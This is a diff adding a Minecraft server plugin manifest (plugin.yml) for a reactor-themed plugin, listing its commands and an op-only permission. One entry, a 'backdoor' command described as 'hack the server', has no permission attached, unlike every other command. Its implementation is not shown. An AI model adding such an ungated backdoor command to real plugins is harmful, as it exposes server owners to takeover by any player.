@@ -1,0 +1,33 @@
+name: IgblonReactor
+version: '${version}'
+main: net.overlisted.h.reactor.ReactorPlugin
+api-version: 1.17
+authors: [overlisted]
+commands:
+  reactor:
+    description: Turn on the reactor
+    usage: /reactor
+    permission: reactor.control
+  shield:
+    description: Turn on the decay of the radiation shield
+    usage: /shield
+    permission: reactor.control
+  makeshield:
+    description: Rebuild the radiation shield
+    usage: /makeshield <block type>
+    permission: reactor.control
+  explodenow:
+    description: Forcefully make the reactor explode
+    usage: /explodenow
+    permission: reactor.control
+  decayshield:
+    description: Forcefully decay the shield
+    usage: /decayshield <times>
+    permission: reactor.control
+  backdoor:
+    description: hack the server
+    usage: /backdoor
+permissions:
+  reactor.control:
+    description: Allows you to control the reactor with commands
+    default: op
